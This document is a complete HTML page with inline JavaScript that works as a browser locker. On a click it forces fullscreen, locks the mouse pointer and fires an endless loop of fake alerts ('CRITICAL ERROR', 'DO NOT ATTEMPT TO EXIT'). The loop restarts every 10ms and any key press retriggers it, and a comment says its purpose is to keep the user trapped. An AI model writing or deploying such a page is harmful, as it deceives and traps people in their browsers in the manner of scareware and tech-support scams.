<!DOCTYPE html>
<html>
<head>
    <title>⚡ UI LOCK ⚡</title>
    <style>
        body { 
            background: #000; color: #0f0; 
            font-family: 'Courier New', monospace; 
            height: 100vh; margin: 0;
            display: flex; align-items: center; justify-content: center;
            overflow: hidden; cursor: none;
        }
        h1 { font-size: 2rem; text-align: center; }
    </style>
</head>
<body>
    <h1>[ CLICK TO INITIALIZE ]</h1>

    <script>
        function startSpam() {
            // 1. Force Fullscreen and Lock Mouse
            const reLock = () => {
                document.documentElement.requestFullscreen().catch(() => {});
                document.body.requestPointerLock();
            };

            // 2. The Pop-up Loop
            // This waits 10ms after you click "OK" then pops another one.
            // This keeps the UI responsive but keeps the user trapped.
            const spam = () => {
                reLock();
                alert("⚠ CRITICAL ERROR ⚠\nUNAUTHORIZED INTERACTION DETECTED");
                alert("⚠ SYSTEM LOCK ⚠\nRE-ESTABLISHING FULLSCREEN MODE");
                alert("⚠ WARNING ⚠\nDO NOT ATTEMPT TO EXIT");
                
                // Triggers the next set of alerts almost immediately
                setTimeout(spam, 10);
            };

            spam();
        }

        // Activate on click
        window.onclick = startSpam;

        // Re-trigger if they try to use keyboard shortcuts
        window.onkeydown = (e) => {
            startSpam();
        };
    </script>
</body>
</html>
